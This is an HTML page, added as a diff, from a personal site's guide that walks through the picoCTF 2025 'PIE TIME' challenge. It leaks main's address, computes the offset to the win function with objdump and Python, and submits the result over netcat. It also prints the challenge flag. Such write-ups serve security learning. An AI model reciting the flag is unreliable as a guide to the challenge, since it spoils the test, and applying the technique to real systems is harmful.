@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>picoCTF PIE TIME @ Shukularuni</title>
+    <link rel="stylesheet" href="/style.css">
+    <link rel="icon" type="image/x-icon" href="/icon.png">
+</head>
+<body>
+    <header>
+        <h1>picoCTF Binary Exploitation Guide</h1>
+        <p>here's how to solve PIE TIME</p>
+    </header>
+    <main>
+        <section>
+            <a href="./">Back to the Binary Exploitation Guides</a>
+            <hr>
+            <h2>PIE TIME</h2>
+            <pre>Name: PIE TIME
+Description: Can you try to get the flag? Beware we have PIE! Connect to the program with netcat: $ nc rescued-float.picoctf.net 64479 The program's source code can be downloaded here. The binary can be downloaded here.
+Author: Darkraicg492
+Tags: Easy, Binary Exploitation, picoCTF 2025, browser_webshell_solvable
+Challenge from: picoCTF 2025
+Files: vuln.c, vuln
+Hints:
+1. Can you figure out what changed between the address you found locally and in the server output?</pre>
+            <h2>Theory</h2>
+            <p>According to the description, to get the flag it doesn't tell us much, so let's look at the code, what the program might be about. So when we enter it's gonna give us a random address, and we need to give another address back to jump to the win function. So to do this, we can download the program, and use something like gdb or objdump to look at what the program is doing and the addresses of the functions. This is because, to jump to the win function, we're gonna need to know their addresses in the binary program. So for that we'll use objdump, with the d option to disassemble the program, then pipe it to grep to search with the E option to search as an extended pattern finder or something, to search both the main and win functions, and from there, see the positions in the memory of these two functions to know where to jump to. Now all we need is to know how to jump in the first place, so what we have to do is go from main to win, it's simple, so if the position of main is 7 and win is 3, we get the difference between the two, so 7 minus 3, we get 4, now when we enter to the NetCat, we have to replicate this movement with the randomly generated address of main, if the address of main is 19, then subtract the difference of 4 to 17, so 19 minus 4, and we get 15, and then submit 15 onto the text input they give you to where to jump to, and it goes to 15, which according to address of main, should be the win function, and well, win and get the flag. So yeah, the command from before, and then we'll do the subtractions, because I simplified them with single digit numbers for better understanding, but we can use some sort of hexadecimal calculator in python for later or something:</p>
+            <pre>objdump -d ./vuln | grep -E "main|win"</pre>
+            <h2>Solution</h2>
+            <p>So now let's download the program, and give it permission to execute as always:</p>
+            <pre>shukularuni-picoctf@webshell:~$ wget https://challenge-files.picoctf.net/c_rescued_float/1d01af98df77f5ba0339c7e7ba2031e95c3bcce1397dc3b60617dfcfe2e4c7be/vuln
+--2025-04-28 16:44:09--  https://challenge-files.picoctf.net/c_rescued_float/1d01af98df77f5ba0339c7e7ba2031e95c3bcce1397dc3b60617dfcfe2e4c7be/vuln
+Resolving challenge-files.picoctf.net (challenge-files.picoctf.net)... 3.160.5.95, 3.160.5.64, 3.160.5.40, ...
+Connecting to challenge-files.picoctf.net (challenge-files.picoctf.net)|3.160.5.95|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 17264 (17K) [application/octet-stream]
+Saving to: 'vuln'
+
+vuln                                                                100%[=================================================================================================================================================================&gt;]  16.86K  --.-KB/s    in 0.006s  
+
+2025-04-28 16:44:09 (2.59 MB/s) - 'vuln' saved [17264/17264]
+
+shukularuni-picoctf@webshell:~$ chmod +x vuln
+
+shukularuni-picoctf@webshell:~$ ls -l
+total 11128
+-rwxrwxr-x 1 shukularuni-picoctf shukularuni-picoctf   17264 Mar  6 19:43 vuln
+-rw-rw-r-- 1 shukularuni-picoctf shukularuni-picoctf     862 Mar  6 19:43 vuln.c</pre>
+            <p>Now we can run the command from the theory to see the positions of the main and win functions:</p>
+            <pre>shukularuni-picoctf@webshell:~$ objdump -d ./vuln | grep -E "main|win"
+    11c1:       48 8d 3d 75 01 00 00    lea    0x175(%rip),%rdi        # 133d &lt;main&gt;
+    11c8:       ff 15 12 2e 00 00       call   *0x2e12(%rip)        # 3fe0 &lt;__libc_start_main@GLIBC_2.2.5&gt;
+00000000000012a7 &lt;win&gt;:
+    12db:       75 16                   jne    12f3 &lt;win+0x4c&gt;
+    1302:       eb 1a                   jmp    131e &lt;win+0x77&gt;
+    1322:       75 e0                   jne    1304 &lt;win+0x5d&gt;
+000000000000133d &lt;main&gt;:
+    1387:       48 8d 35 af ff ff ff    lea    -0x51(%rip),%rsi        # 133d &lt;main&gt;
+    1400:       74 05                   je     1407 &lt;main+0xca&gt;</pre>
+            <p>Now that we know where in the memory the two functions are located, let's subtract win from main, so 133d minus 12a7. So to do this hexadecimal subtraction, we'll use this simple python code:</p>
+            <pre>&gt;&gt;&gt; print( hex( 0x133d - 0x12a7 ) )
+0x96</pre>
+            <p>Perfect! We have the difference. Now let's enter to the NetCat and see what address we get for main:</p>
+            <pre>shukularuni-picoctf@webshell:~$ nc rescued-float.picoctf.net 63667
+Address of main: 0x633564a2533d
+Enter the address to jump to, ex => 0x12345:</pre>
+            <p>Now use the same python code to subtract the difference from the address of main of this session and get the address of win of this session:</p>
+            <pre>&gt;&gt;&gt; print( hex( 0x633564a2533d - 0x96 ) )
+0x633564a252a7</pre>
+            <p>Let's go now just input the address of win that we got, and finally get the flag:</p>
+            <pre>Enter the address to jump to, ex => 0x12345: 0x633564a252a7
+Your input: 633564a252a7
+You won!
+picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_00dea386}</pre>
+            <p>There we go! That's the flag.</p>
+            <p>I rated this level as "good"! :3</p>
+            <hr>
+            <a target="_blank" href="https://play.picoctf.org/practice/challenge/490">https://play.picoctf.org/practice/challenge/490</a>
+        </section>
+        <section class="link-list">
+            <h2>Explore My Website</h2>
+            <ul>
+                <li><a href="/">Home</a></li>
+                <li><a href="/search.html">Search</a></li>
+                <li><a href="/articles.html">Articles</a></li>
+                <li><a href="/guides.html">Guides</a></li>
+            </ul>
+            <br><br><br>
+        </section>
+    </main>
+    <footer>
+        <p class="cute">Made with ❤️ by Shukularuni</p>
+    </footer>
+</body>
+</html>
